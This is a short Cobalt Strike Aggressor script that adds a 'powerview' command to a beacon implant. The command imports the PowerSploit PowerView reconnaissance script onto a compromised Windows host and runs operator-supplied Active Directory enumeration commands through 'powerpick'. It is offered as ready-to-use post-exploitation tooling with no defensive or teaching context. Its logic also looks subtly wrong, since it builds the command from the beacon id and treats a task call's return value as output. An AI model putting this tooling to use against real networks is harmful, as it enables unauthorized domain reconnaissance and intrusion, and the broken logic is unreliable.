# Define the alias for PowerView command
alias powerview {
    # Extract the command arguments (the PowerView function to run)
    local('$command $args $powerview_loaded');

    # Join all arguments into a single command string
    $command = join($1, " ");

    # Check if PowerView is already imported by attempting to run a known PowerView function
    $powerview_loaded = beacon_shell($1, "Get-Command Get-Domain");

    # Check the response to determine if PowerView is loaded
    if ($powerview_loaded =~ "Get-Domain") {
        btask($1, "PowerView is already imported.");
    } else {
        # Import PowerView if not already imported
        btask($1, "Importing PowerView.");
        beacon_execute($1, "powershell-import C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
        # Adding a slight delay to ensure the import completes
        sleep(2000);
    }

    # Execute the provided PowerView command using powerpick
    btask($1, "Running PowerView command: $+ $command");
    beacon_execute($1, "powerpick $command");
}

# Register the custom command
beacon_command_register("powerview", "Execute PowerView commands", "Runs the specified PowerView command after ensuring it's imported.");
